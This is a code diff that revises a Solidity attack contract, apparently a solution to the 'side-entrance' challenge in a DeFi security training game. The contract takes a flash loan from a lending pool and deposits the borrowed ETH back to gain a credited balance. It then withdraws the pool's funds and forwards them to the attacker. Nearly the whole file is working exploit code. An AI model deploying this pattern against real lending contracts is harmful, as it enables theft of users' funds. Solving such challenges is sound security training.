@@ -1,37 +1,39 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import '../side-entrance/SideEntranceLenderPool.sol';
+import "../side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceAttack {
-	SideEntranceLenderPool immutable pool;
-	address owner;
+    SideEntranceLenderPool immutable pool;
+    address immutable owner;
 
-	receive() external payable {}
+    receive() external payable {}
 
-	constructor(address _pool) {
-		pool = SideEntranceLenderPool(_pool);
-		owner = msg.sender;
-	}
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = msg.sender;
+    }
 
-	function executeFlashLoan(uint256 _amount) external payable {
-		pool.flashLoan(_amount);
-	}
+    function executeFlashLoan(uint256 _amount) external payable {
+        require(owner == msg.sender);
+        pool.flashLoan(_amount);
+    }
 
-	// Receive 1000 ether when executed
-	function execute() external payable {
-		// Use the same 1000 ether to execute deposit() function on the pool, so this will:
-		// a) Not increment the pool ETH balance (because they're the same ETH going back and forth)
-		// b) Increment the balance of this contract in Pool's mapping to 1000
-		// making possible the draining of the pool (withdrawing of 1000 ETH)
-		pool.deposit{value: msg.value}();
-	}
+    function execute() external payable {
+        // Use the 1000 ETH received to call deposit() function on the pool,
+        // and increment the balance of this contract in Pool's mapping to
+        // 1000 ETH without actually incrementing the pool 's ETH balance.
+        pool.deposit{value: msg.value}();
+    }
 
-	function withdraw() public {
-		// Withdraw pool's balance to this contract
-		pool.withdraw();
+    function withdraw() external returns (bool) {
+        require(owner == msg.sender);
 
-		// Send this contract's ETH balance to caller of this function
-		owner.call{value: address(this).balance}('');
-	}
+        // Withdraw from pool's balance to this contract
+        pool.withdraw();
+
+        // Send from this contract to owner (attacker)
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        return success;
+    }
 }
